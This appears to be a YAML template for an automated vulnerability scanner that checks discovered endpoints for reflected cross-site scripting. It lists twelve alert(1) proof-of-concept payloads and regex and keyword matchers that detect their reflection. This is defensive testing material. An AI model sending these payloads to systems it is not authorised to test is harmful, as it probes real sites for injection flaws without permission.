id: generic-xss-reflected
info:
  name: Reflected XSS
  description: Tests for reflected cross-site scripting in discovered endpoints
  owasp_category: A03:2021
  severity: medium
  tags:
    - xss
    - injection
    - client-side
    - generic

generic:
  endpoint: "{{all_discovered}}"
  method: GET
  parameter: "{{input_param}}"

  payloads:
    - "<script>alert(1)</script>"
    - "<img src=x onerror=alert(1)>"
    - "<svg/onload=alert(1)>"
    - "\"'><script>alert(1)</script>"
    - "javascript:alert(1)"
    - "<iframe src=javascript:alert(1)>"
    - "<body onload=alert(1)>"
    - "<input onfocus=alert(1) autofocus>"
    - "<marquee onstart=alert(1)>"
    - "<details open ontoggle=alert(1)>"
    - "'-alert(1)-'"
    - "\"-alert(1)-\""

  matchers:
    - type: regex
      condition: or
      regex:
        - "<script[^>]*>alert\\("
        - "<img[^>]*onerror"
        - "<svg[^>]*onload"
        - "javascript:alert\\("
        - "<iframe[^>]*src.*javascript"
        - "<body[^>]*onload"
        - "onfocus\\s*=.*alert"
        - "ontoggle\\s*=.*alert"
        - "<marquee[^>]*onstart"
        - "onerror\\s*="
        - "onload\\s*="
    - type: word
      condition: or
      words:
        - "<script>"
        - "<img src"
        - "<svg"
        - "onerror"
        - "onload"
        - "javascript:"
      case_sensitive: false

  matchers_condition: or
